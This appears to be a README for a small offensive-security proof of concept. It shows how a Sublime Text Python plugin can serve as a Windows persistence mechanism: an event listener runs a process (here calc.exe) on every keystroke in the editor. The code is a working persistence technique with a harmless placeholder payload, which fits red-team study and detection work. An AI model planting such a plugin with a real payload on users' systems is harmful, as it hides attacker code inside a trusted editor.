# Sublime-persistence
Windows persistence method that abuses sublime packages.

Sublime text allows the ability to create custom plugins written in python. 
An API reference is posted below.
https://www.sublimetext.com/docs/api_reference.html



```import sublime
import sublime_plugin
import subprocess


class OpenCalcOnModified(sublime_plugin.EventListener):
    def on_modified(self, view):
        subprocess.Popen('calc.exe', shell=True)```

In the above python script we define a class called 'OpenCalcOnModified' which invokes the on_modified function. 
When a keystroke is detected within the sublime text editor, the .POpen() method in the subproccess module executes calc.exe.  

![image](https://github.com/rootd4ddy/Sublime-persistence/assets/129632649/993016ec-0b9a-418a-92b9-60de66f32308)


